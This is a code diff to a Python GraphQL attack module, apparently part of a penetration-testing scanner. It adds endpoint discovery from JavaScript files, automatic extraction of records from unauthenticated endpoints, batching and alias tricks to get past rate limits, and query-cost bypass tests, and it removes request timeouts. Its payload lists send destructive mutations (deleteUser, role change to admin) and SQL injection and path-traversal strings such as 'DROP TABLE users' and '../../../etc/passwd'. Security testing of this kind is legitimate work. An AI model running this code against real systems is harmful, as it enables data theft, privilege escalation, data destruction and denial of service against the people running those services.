@@ -1,7 +1,6 @@
 import re
 import json
 import asyncio
-from typing import Dict, List, Set, Optional, Tuple
 from urllib.parse import urljoin
 from modules.base import BaseModule
 from core.http import get_base_url
@@ -17,6 +16,14 @@ class GraphqlModule(BaseModule):
         "/v1/graphql", "/v2/graphql", "/query", "/gql",
         "/graphiql", "/playground", "/console", "/api", "/api/v1",
         "/altair", "/voyager", "/graphql-explorer",
+    ]
+    
+    js_graphql_patterns = [
+        r'["\'](/graphql[^\'"]*)["\']',
+        r'["\'](/api/graphql[^\'"]*)["\']',
+        r'fetch\s*\(\s*["\']([^"\']+graphql[^"\']*)["\']',
+        r'apollo[^{]*uri:\s*["\']([^"\']+)["\']',
+        r'graphql[^{]*endpoint:\s*["\']([^"\']+)["\']',
     ]
     
     introspection_query = '''
@@ -49,26 +56,40 @@ class GraphqlModule(BaseModule):
     
     async def scan(self, target: str):
         self.findings = []
-        self.schema: Optional[Dict] = None
-        self.endpoint: Optional[str] = None
-        self.mutations: List[str] = []
-        self.queries: List[str] = []
-        self.sensitive_fields: Set[str] = set()
+        self.schema = None
+        self.endpoint = None
+        self.mutations = []
+        self.queries = []
+        self.sensitive_fields = set()
+        self.extracted_data = {}
         
         base_url = get_base_url(target)
         
         self.endpoint = await self._find_graphql_endpoint(base_url)
+        
+        if not self.endpoint and self.aggressive:
+            js_endpoints = await self._discover_endpoints_from_js(target)
+            for ep in js_endpoints:
+                test_url = urljoin(base_url, ep)
+                if await self._is_graphql_endpoint(test_url):
+                    self.endpoint = test_url
+                    break
         
         if self.endpoint:
             self.schema = await self._test_introspection(self.endpoint)
             
             if self.schema:
                 await self._analyze_schema(self.schema)
+                
+                if self.aggressive:
+                    await self._auto_extract_data(self.endpoint)
             
             await self._test_field_suggestions(self.endpoint)
             await self._test_batching_attacks(self.endpoint)
+            await self._test_batch_alias_rate_bypass(self.endpoint)
             await self._test_depth_attack(self.endpoint)
             await self._test_alias_dos(self.endpoint)
+            await self._test_cost_complexity_bypass(self.endpoint)
             await self._test_mutation_permissions(self.endpoint)
             await self._test_subscription_abuse(self.endpoint)
             await self._test_injection(self.endpoint)
@@ -76,7 +97,130 @@ class GraphqlModule(BaseModule):
         
         return self.findings
     
-    async def _find_graphql_endpoint(self, base_url: str) -> Optional[str]:
+    async def _discover_endpoints_from_js(self, target: str):
+        endpoints = set()
+        try:
+            from core.js_analyzer import create_analyzer
+            analyzer = create_analyzer()
+            js_result = await analyzer.analyze_url(self.http, target)
+            
+            if js_result.api_endpoints:
+                for ep in js_result.api_endpoints:
+                    if "graphql" in ep.lower() or "gql" in ep.lower():
+                        endpoints.add(ep)
+            
+            for script_url in js_result.scripts_analyzed:
+                resp = await self.http.get(script_url)
+                if resp.get("status") == 200:
+                    content = resp.get("text", "")
+                    for pattern in self.js_graphql_patterns:
+                        matches = re.findall(pattern, content, re.IGNORECASE)
+                        endpoints.update(matches)
+        except Exception:
+            pass
+        
+        return list(endpoints)
+    
+    async def _is_graphql_endpoint(self, url: str) -> bool:
+        resp = await self.http.post(
+            url,
+            json={"query": "{ __typename }"},
+            headers={"Content-Type": "application/json"}
+        )
+        if resp.get("status") == 200:
+            try:
+                data = json.loads(resp.get("text", ""))
+                return "data" in data or "errors" in data
+            except json.JSONDecodeError:
+                pass
+        return False
+    
+    async def _auto_extract_data(self, endpoint: str):
+        if not self.schema:
+            return
+        
+        query_type = self.schema.get("queryType")
+        if not query_type:
+            return
+        
+        types = self.schema.get("types", [])
+        query_type_def = None
+        for t in types:
+            if t.get("name") == query_type.get("name"):
+                query_type_def = t
+                break
+        
+        if not query_type_def:
+            return
+        
+        for field in (query_type_def.get("fields") or [])[:10]:
+            field_name = field.get("name", "")
+            if field_name.startswith("_"):
+                continue
+            
+            query = self._build_extraction_query(field, types)
+            if not query:
+                continue
+            
+            resp = await self.http.post(
+                endpoint,
+                json={"query": query},
+                headers={"Content-Type": "application/json"}
+            )
+            
+            if resp.get("status") == 200:
+                try:
+                    data = json.loads(resp.get("text", ""))
+                    if data.get("data", {}).get(field_name):
+                        result = data["data"][field_name]
+                        if isinstance(result, list) and len(result) > 0:
+                            self.extracted_data[field_name] = result[:5]
+                            self.add_finding(
+                                "HIGH",
+                                f"Data extraction successful: {field_name}",
+                                url=endpoint,
+                                evidence=f"Extracted {len(result)} records",
+                                confidence_evidence=["data_extracted", "no_auth_required"],
+                                request_data={"method": "POST", "url": endpoint, "payload": query}
+                            )
+                        elif isinstance(result, dict):
+                            self.extracted_data[field_name] = result
+                except json.JSONDecodeError:
+                    pass
+    
+    def _build_extraction_query(self, field, types):
+        field_name = field.get("name", "")
+        field_type = field.get("type", {})
+        
+        inner_type = field_type
+        while inner_type.get("ofType"):
+            inner_type = inner_type["ofType"]
+        
+        type_name = inner_type.get("name", "")
+        
+        target_type = None
+        for t in types:
+            if t.get("name") == type_name:
+                target_type = t
+                break
+        
+        if not target_type or target_type.get("kind") not in ("OBJECT", "INTERFACE"):
+            return f"{{ {field_name} }}"
+        
+        subfields = []
+        for sf in (target_type.get("fields") or [])[:10]:
+            sf_type = sf.get("type", {})
+            while sf_type.get("ofType"):
+                sf_type = sf_type["ofType"]
+            if sf_type.get("kind") in ("SCALAR", "ENUM"):
+                subfields.append(sf.get("name"))
+        
+        if not subfields:
+            return None
+        
+        return f"{{ {field_name} {{ {' '.join(subfields)} }} }}"
+    
+    async def _find_graphql_endpoint(self, base_url: str):
         for endpoint in self.common_endpoints:
             url = urljoin(base_url, endpoint)
             
@@ -111,7 +255,7 @@ class GraphqlModule(BaseModule):
         
         return None
     
-    async def _test_introspection(self, endpoint: str) -> Optional[Dict]:
+    async def _test_introspection(self, endpoint: str):
         resp = await self.http.post(
             endpoint,
             json={"query": self.introspection_query},
@@ -129,7 +273,9 @@ class GraphqlModule(BaseModule):
                         "HIGH",
                         f"GraphQL introspection enabled",
                         url=endpoint,
-                        evidence=f"Found {len(types)} types exposed"
+                        evidence=f"Found {len(types)} types exposed",
+                        confidence_evidence=["introspection_response", "schema_exposed"],
+                        request_data={"method": "POST", "url": endpoint, "payload": "IntrospectionQuery"}
                     )
                     
                     self.record_success("introspection", endpoint)
@@ -139,7 +285,7 @@ class GraphqlModule(BaseModule):
         
         return None
     
-    async def _analyze_schema(self, schema: Dict):
+    async def _analyze_schema(self, schema: dict):
         types = schema.get("types", [])
         
         for type_def in types:
@@ -236,6 +382,54 @@ class GraphqlModule(BaseModule):
                             break
                 except json.JSONDecodeError:
                     pass
+
+    async def _test_batch_alias_rate_bypass(self, endpoint: str):
+        alias_batch = []
+        for i in range(200):
+            alias_batch.append(f"a{i}: __typename")
+        query = "query { " + " ".join(alias_batch) + " }"
+        resp = await self.http.post(
+            endpoint,
+            json=[{"query": query} for _ in range(10)],
+            headers={"Content-Type": "application/json"}
+        )
+        if resp.get("status") == 200:
+            try:
+                data = json.loads(resp.get("text", ""))
+                if isinstance(data, list) and len(data) >= 10:
+                    self.add_finding(
+                        "HIGH",
+                        "GraphQL batch + alias rate limit bypass",
+                        url=endpoint,
+                        evidence="200+ aliases in batch; rate limit bypass possible"
+                    )
+            except json.JSONDecodeError:
+                pass
+
+    async def _test_cost_complexity_bypass(self, endpoint: str):
+        if not self.queries:
+            return
+        deep_query = "query { "
+        for i, q in enumerate(self.queries[:3]):
+            deep_query += f"q{i}: {q} " + " ".join([f"{{ {q} }}" for _ in range(5)]) + " "
+        deep_query += "}"
+        resp = await self.http.post(
+            endpoint,
+            json={"query": deep_query},
+            headers={"Content-Type": "application/json"}
+        )
+        if resp.get("status") == 200:
+            try:
+                data = json.loads(resp.get("text", ""))
+                if data.get("data") and not data.get("errors"):
+                    self.add_finding(
+                        "MEDIUM",
+                        "GraphQL query cost/complexity limit weak or absent",
+                        url=endpoint,
+                        evidence="Deep nested query accepted; DoS or cost bypass"
+                    )
+            except json.JSONDecodeError:
+                pass
     
     async def _test_depth_attack(self, endpoint: str):
         depths = [5, 10, 20, 50]
@@ -246,8 +440,7 @@ class GraphqlModule(BaseModule):
             resp = await self.http.post(
                 endpoint,
                 json={"query": nested},
-                headers={"Content-Type": "application/json"},
-                timeout=10
+                headers={"Content-Type": "application/json"}
             )
             
             if resp.get("status") == 200:
@@ -273,8 +466,7 @@ class GraphqlModule(BaseModule):
                 resp = await self.http.post(
                     endpoint,
                     json={"query": query},
-                    headers={"Content-Type": "application/json"},
-                    timeout=15
+                    headers={"Content-Type": "application/json"}
                 )
                 
                 if resp.get("status") == 200:
@@ -293,7 +485,7 @@ class GraphqlModule(BaseModule):
                 break
     
     async def _test_mutation_permissions(self, endpoint: str):
-        dangerous_mutations: List[Tuple[str, str]] = [
+        dangerous_mutations = [
             ('mutation { deleteUser(id: "1") }', "deleteUser"),
             ('mutation { updateRole(userId: "1", role: "admin") }', "updateRole"),
             ('mutation { resetPassword(email: "test@test.com") }', "resetPassword"),
@@ -351,7 +543,7 @@ class GraphqlModule(BaseModule):
                 )
     
     async def _test_injection(self, endpoint: str):
-        injection_payloads: List[Tuple[str, str]] = [
+        injection_payloads = [
             ('{ user(id: "1\' OR \'1\'=\'1") { id } }', "SQLi"),
             ('{ user(id: "1; DROP TABLE users--") { id } }', "SQLi"),
             ('{ user(id: "../../../etc/passwd") { id } }', "LFI"),
@@ -416,12 +608,13 @@ class GraphqlModule(BaseModule):
                     except json.JSONDecodeError:
                         pass
     
-    async def exploit(self, target: str, finding: Dict):
+    async def exploit(self, target: str, finding: dict):
         results = {
             "extracted_schema": self.schema,
             "sensitive_fields": list(self.sensitive_fields),
             "mutations": self.mutations,
             "queries": self.queries,
+            "extracted_data": self.extracted_data,
         }
         
         if self.schema:
@@ -430,10 +623,21 @@ class GraphqlModule(BaseModule):
         if self.sensitive_fields:
             self.add_exploit_data("sensitive_fields", list(self.sensitive_fields))
         
+        if self.extracted_data:
+            self.add_exploit_data("extracted_data", self.extracted_data)
+            for field_name, data in self.extracted_data.items():
+                self.add_finding(
+                    "CRITICAL",
+                    f"GraphQL data extracted: {field_name}",
+                    url=self.endpoint,
+                    evidence=f"Records: {len(data) if isinstance(data, list) else 1}",
+                    confidence_evidence=["data_extracted", "exploit_confirmed"]
+                )
+        
         return results
     
-    def get_schema(self) -> Optional[Dict]:
+    def get_schema(self):
         return self.schema
     
-    def get_endpoint(self) -> Optional[str]:
+    def get_endpoint(self):
         return self.endpoint
